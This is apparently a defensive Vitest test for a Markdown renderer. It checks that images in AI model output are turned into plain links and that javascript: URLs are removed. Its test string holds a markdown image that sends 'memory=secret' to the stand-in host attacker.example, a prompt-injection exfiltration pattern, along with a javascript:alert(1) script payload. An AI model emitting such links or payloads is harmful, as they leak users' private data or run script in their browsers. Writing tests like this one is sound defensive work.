import { renderToStaticMarkup } from 'react-dom/server';
import { expect, it } from 'vitest';
import { Markdown } from '../../src/components/berthwise/markdown';

it('never loads images from model output, so injected image URLs cannot leak data', () => {
  const html = renderToStaticMarkup(<Markdown content={'Rates ![quote](https://attacker.example/x.png?memory=secret) and ![](javascript:alert(1))'} />);
  expect(html).not.toContain('<img');
  expect(html).toContain('href="https://attacker.example/x.png?memory=secret"');
  expect(html).toContain('>quote</a>');
  expect(html).not.toContain('javascript:');
});
